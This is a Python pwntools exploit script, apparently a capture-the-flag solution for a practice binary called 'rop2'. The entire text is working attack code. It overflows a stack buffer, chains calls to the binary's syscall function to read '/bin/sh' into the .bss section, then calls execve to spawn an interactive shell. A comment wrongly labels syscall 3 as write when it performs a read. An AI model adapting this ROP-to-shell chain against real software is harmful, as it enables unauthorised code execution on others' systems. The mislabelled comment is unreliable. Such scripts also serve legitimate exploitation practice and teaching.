#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

def debug(addr = 0x08048486):
    raw_input("debug:")
    gdb.attach(io, "b *" + str(addr))

elf = ELF("./rop2")
syscall_addr = elf.symbols["syscall"]
vuln_addr = elf.symbols["overflow"]
bss_addr = elf.bss()

#syscall(3, 0, bss_addr, 8) -> write(0, bss_addr, 8)
payload = fit({0xC + 0x4: [p32(syscall_addr), p32(vuln_addr), p32(3), p32(0), p32(bss_addr), p32(8)]})

io = process("./rop2")
#  debug()
io.sendlineafter("your ropchain:", payload)
io.send("/bin/sh\0")

#syscall(11, bss_addr, 0, 0) -> execve("/bin/sh", 0, 0)
payload = fit({0xC + 0x4: [p32(syscall_addr), p32(0xdeadbeef), p32(11), p32(bss_addr), p32(0), p32(0)]})
io.sendline(payload)

io.interactive()
io.close()
